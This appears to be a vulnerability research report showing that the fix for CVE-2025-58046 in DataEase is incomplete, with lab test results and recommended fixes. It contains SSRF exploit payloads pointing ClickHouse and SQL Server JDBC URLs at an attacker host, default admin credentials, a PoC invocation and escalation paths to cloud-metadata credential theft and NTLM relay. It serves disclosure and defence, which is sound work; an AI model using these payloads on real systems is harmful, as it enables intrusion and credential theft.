# Bypass Analysis: CVE-2025-58046

## Bypass Status: ✅ BYPASS CONFIRMED — Fix is INCOMPLETE

The fix for CVE-2025-58046 (commit `77078658715bd85af5867afbfd5f1fcc37cf03c8`) is **incomplete**. It only patches `Impala.java` and `Db2.java`, but the **identical vulnerability pattern** — unvalidated JDBC URLs passed directly to JDBC drivers — exists in multiple sibling datasource type classes that remain unpatched in v2.10.13.

**Two independent bypass vectors were confirmed with full proof-of-concept exploitation against DataEase v2.10.13 (patched).**

---

## Bypass Hypothesis

### Observation
The fix commit modifies exactly 2 files: `Impala.java` and `Db2.java`. Both files are in `core/core-backend/src/main/java/io/dataease/datasource/type/`. This directory contains 11 datasource type classes, all following the same pattern: a `getJdbc()` method that constructs/returns a JDBC URL from user-supplied configuration.

### Hypothesis
If the fix only addresses Impala and Db2, then the remaining 9 datasource types may still have the same vulnerability — unvalidated JDBC URL parameters. An attacker can bypass the fix by simply changing the `type` field in the exploit request from `"impala"` to another datasource type.

### Tested Vectors
1. **ClickHouse (`type: "ck"`)** — CK.java has NO blocklist at all
2. **SQL Server (`type: "sqlServer"`)** — Sqlserver.java has a blocklist but it's dead code (never checked)
3. **Mongo (`type: "mongo"`)** — Mongo.java custom URL path skips blocklist (but CalciteProvider maps it to Mysql.class, accidentally protecting it)

---

## Bypass Method

### Bypass Vector 1: ClickHouse (CK) — HTTP-based SSRF ✅ CONFIRMED

**Datasource type**: `ck`
**File**: `CK.java` (completely unpatched in v2.10.13)
**Driver**: `com.clickhouse.jdbc.ClickHouseDriver` (clickhouse-jdbc-0.4.6.jar)

**Why it works**: CK.java has NO `illegalParameters` blocklist at all. The `getJdbc()` method returns the user-supplied JDBC URL after only checking `startsWith("jdbc:clickhouse")`. The ClickHouse JDBC driver uses **HTTP as its transport protocol**, so when DataEase attempts to validate the datasource, the driver makes an HTTP POST request to the attacker-controlled URL — providing clean HTTP-based SSRF detection.

**Vulnerable code (CK.java at v2.10.13, UNCHANGED from v2.10.12)**:
```java
public String getJdbc() {
    if (StringUtils.isNoneEmpty(getUrlType()) && !getUrlType().equalsIgnoreCase("hostName")) {
        if (!getJdbcUrl().startsWith("jdbc:clickhouse")) {
            DEException.throwException("Illegal jdbcUrl: " + getJdbcUrl());
        }
        return getJdbcUrl();  // ← NO blocklist, returns raw attacker-controlled URL
    }
    // hostname mode also has no validation on extraParams
    ...
}
```

**Exploit payload**:
```json
{
  "name": "bypass-ck",
  "type": "ck",
  "configuration": "<base64 of {urlType: 'jdbcUrl', jdbcUrl: 'jdbc:clickhouse://ATTACKER_IP:PORT/default'}>"
}
```

**Evidence**: HTTP POST callback received from DataEase container (172.25.0.5) with User-Agent `ClickHouse-JdbcDriver/0.4.6`.

### Bypass Vector 2: SQL Server — Dead-Code Blocklist ✅ CONFIRMED

**Datasource type**: `sqlServer`
**File**: `Sqlserver.java` (completely unpatched in v2.10.13)
**Driver**: `com.microsoft.sqlserver.jdbc.SQLServerDriver` (mssql-jdbc-12.2.0.jre11.jar)

**Why it works**: Sqlserver.java has an `illegalParameters` list, but the `getJdbc()` method **never references it** — identical to the pre-fix Impala.java. Both the custom JDBC URL path and the hostname+extraParams path return unvalidated URLs. The blocklist is entirely dead code.

**Vulnerable code (Sqlserver.java at v2.10.13, UNCHANGED from v2.10.12)**:
```java
// Line 17: Blocklist exists but is NEVER CHECKED in getJdbc()
private List<String> illegalParameters = Arrays.asList(
    "autoDeserialize", "queryInterceptors", "statementInterceptors", "detectCustomCollations");

public String getJdbc() {
    if(StringUtils.isNoneEmpty(getUrlType()) && !getUrlType().equalsIgnoreCase("hostName")){
        if (!getJdbcUrl().startsWith("jdbc:sqlserver")) {
            DEException.throwException("Illegal jdbcUrl: " + getJdbcUrl());
        }
        return getJdbcUrl();  // ← illegalParameters NEVER checked! Dead code!
    }
    // hostname mode with extraParams also unvalidated
    ...
}
```

**Exploit payload**:
```json
{
  "name": "bypass-sqlserver",
  "type": "sqlServer",
  "configuration": "<base64 of {urlType: 'jdbcUrl', jdbcUrl: 'jdbc:sqlserver://ATTACKER_IP:PORT;DatabaseName=master;loginTimeout=5'}>"
}
```

**Evidence**: Multiple TDS protocol connections received from DataEase container (172.25.0.5) on port 9433. Data begins with `0x12` (TDS pre-login packet header), confirming the SQL Server JDBC driver connected to our controlled endpoint.

### Bypass Vector 3: Mongo — Blocked by Accident

**Datasource type**: `mongo`
**Result**: BLOCKED (not a viable bypass)

While Mongo.java's custom URL path doesn't check the blocklist, the `CalciteProvider.getConnection()` method maps `mongo` type to `Mysql.class` (not `Mongo.class`) for deserialization. This means `Mysql.java`'s `getJdbc()` — which has proper validation with URLDecoder and expanded blocklist — is executed instead. This accidentally protects the Mongo datasource path.

Relevant CalciteProvider code:
```java
switch (datasourceType) {
    case mysql:
    case mongo:     // ← mapped to Mysql.class!
    case StarRocks:
    case doris:
    case TiDB:
    case mariadb:
        configuration = JsonUtil.parseObject(coreDatasource.getConfiguration(), Mysql.class);
        break;
    // ...
}
```

---

## Test Results

### Baseline: Original Impala Exploit on Patched Container
```
Target: 172.25.0.5:8100 (DataEase v2.10.13)
Result: BLOCKED
Response: "Illegal parameter: krbJAASFile"
```
The fix correctly blocks the original CVE-2025-58046 attack via Impala.

### Bypass Vector 1: ClickHouse on Patched Container
```
Target: 172.25.0.5:8100 (DataEase v2.10.13)
Payload: type="ck", urlType="jdbcUrl", jdbcUrl="jdbc:clickhouse://172.25.0.4:9080/default"
Result: BYPASS CONFIRMED

HTTP Callback:
  Client: 172.25.0.5:35154
  Path: /?extremes=0
  User-Agent: ClickHouse-JdbcDriver/0.4.6 (Linux/6.12.68-linuxkit; OpenJDK 64-Bit Server VM/21.0.6+7-alpine-r0; HttpURLConnection; rv:dd91e17)
```

### Bypass Vector 2: SQL Server on Patched Container
```
Target: 172.25.0.5:8100 (DataEase v2.10.13)
Payload: type="sqlServer", urlType="jdbcUrl", jdbcUrl="jdbc:sqlserver://172.25.0.4:9433;DatabaseName=master;loginTimeout=5"
Result: BYPASS CONFIRMED

TCP Callbacks (8 TDS connections):
  From: 172.25.0.5:46778 (67 bytes, TDS pre-login: 0x1201004300...)
  From: 172.25.0.5:46792 (67 bytes, TDS pre-login: 0x1201004300...)
  [6 additional connections]
```

### Cross-Verification on Vulnerable Container
Both bypass vectors were also tested against the vulnerable container (v2.10.12) to confirm they work independently:
```
ClickHouse on v2.10.12: WORKS (HTTP callback received from 172.25.0.3)
SQL Server on v2.10.12: WORKS (TDS connections received from 172.25.0.3)
```
This confirms these bypass vectors exploit the same class of vulnerability but via different, unpatched code paths.

---

## Bypass Script

**Location**: `poc/bypass_poc.py`

**Usage**:
```bash
pip install pycryptodome
python3 bypass_poc.py <target_host> <target_port> <callback_host>
# Default: python3 bypass_poc.py 172.25.0.5 8100 172.25.0.4
```

**Full output**: `poc/bypass_output.txt`

---

## Severity Assessment

### Impact: CRITICAL (CVSS 9.8 equivalent)

The bypass maintains the **same severity** as the original CVE-2025-58046:
- **Attack Vector**: Network (same API endpoint: `/de2api/datasource/validate`)
- **Authentication**: Same (default credentials `admin`/`DataEase@123456`)
- **Complexity**: Trivial — the attacker only changes `"type": "impala"` to `"type": "ck"` or `"type": "sqlServer"`
- **Impact**: Same SSRF → potential RCE chain

### ClickHouse SSRF Escalation Path
The ClickHouse JDBC driver uses HTTP transport, making the SSRF directly weaponizable:
1. **SSRF to internal services**: Point the JDBC URL at internal HTTP endpoints (metadata services, admin panels, etc.)
2. **Data exfiltration**: If a real ClickHouse instance exists internally, the attacker can read data
3. **Credential theft**: Access cloud metadata endpoints (e.g., AWS `169.254.169.254`)

### SQL Server SSRF Escalation Path
The SQL Server JDBC driver connects via TCP (TDS protocol):
1. **SSRF to internal SQL Server instances**: Connect to internal databases
2. **NTLM relay**: With `integratedSecurity=true`, the MSSQL JDBC driver may attempt NTLM authentication, enabling credential relay attacks
3. **Port scanning**: Use connection timeout behavior to scan internal ports

### This Constitutes New Vulnerabilities
These bypass vectors represent **new, unfixed vulnerabilities** that should receive their own CVE identifiers. The root cause is identical (CWE-74: Injection / CWE-20: Improper Input Validation), but the affected components are different:
- CK.java (ClickHouse datasource) — no validation whatsoever
- Sqlserver.java (SQL Server datasource) — dead-code blocklist

---

## Recommended Fix

### Immediate (address the bypass)
1. Apply the same fix pattern from Impala.java to ALL datasource types:
   - **CK.java**: Add `illegalParameters` blocklist and validation in both code paths
   - **Sqlserver.java**: Actually CHECK the existing `illegalParameters` list in `getJdbc()`
   - **Oracle.java**: Add blocklist and validation
   - **H2.java**: Add URL decoding before parameter checks

2. Each datasource type's blocklist should include driver-specific dangerous parameters:
   - ClickHouse: `custom_http_params`, `custom_http_headers`, etc.
   - SQL Server: `jaasConfigurationName`, `integratedSecurity`, `gsscredential`, etc.
   - Oracle: `oracle.net.ldap_admin`, `javax.net.ssl.*`, etc.

### Long-term (architectural fix)
1. **Centralized validation**: Move JDBC URL validation to `CalciteProvider.getConnection()` or `DatasourceServer.validate()` so it applies to ALL datasource types automatically
2. **Allowlist approach**: Instead of a blocklist, define allowed parameters per driver and reject everything else
3. **URL parsing**: Parse the JDBC URL and validate each parameter name against the allowlist, rather than using string contains checks

### Additional datasource types to audit
| Type | File | Status | Risk |
|------|------|--------|------|
| `ck` | CK.java | **NO BLOCKLIST** | CRITICAL |
| `sqlServer` | Sqlserver.java | Dead-code blocklist | CRITICAL |
| `oracle` | Oracle.java | No blocklist | HIGH |
| `h2` | H2.java | No URL decoding | MEDIUM |
| `pg` | Pg.java | Case-sensitive check on custom URL path | LOW |
| `redshift` | Redshift.java | Case-sensitive check on custom URL path | LOW |

---

## Confidence Level

**HIGH (95%)** — The bypass is confirmed with:
- HTTP callback proof from ClickHouse JDBC driver (with driver User-Agent identification)
- TDS protocol data from SQL Server JDBC driver (multiple TCP connections with protocol headers)
- Testing on both vulnerable (v2.10.12) and patched (v2.10.13) containers
- Source code analysis confirming the vulnerability pattern is identical across files
- Verification that the fix commit only touches Impala.java and Db2.java

---

## Lab Details

| Component | IP | Version | Role |
|-----------|-----|---------|------|
| DataEase (vulnerable) | 172.25.0.3 | v2.10.12 | Baseline vulnerable target |
| DataEase (patched) | 172.25.0.5 | v2.10.13 | Patched target (bypass confirmed) |
| MySQL | 172.25.0.2 | 8.4.5 | Shared database |
| Attacker | 172.25.0.4 | — | PoC execution + callback servers |

### Patched Container Setup
- **Dockerfile**: `Dockerfile.patched`
- **Image**: `registry.cn-qingdao.aliyuncs.com/dataease/dataease:v2.10.13`
- **Container**: `cve-2025-58046-patched`
- **Port**: 18101 (host) → 8100 (container)

---

## Files

| File | Purpose |
|------|---------|
| `poc/bypass_poc.py` | Bypass PoC script (3 vectors) |
| `poc/bypass_output.txt` | Full bypass test output |
| `Dockerfile.patched` | Patched container Dockerfile |
| `docker-compose.yml` | Updated compose with patched service |
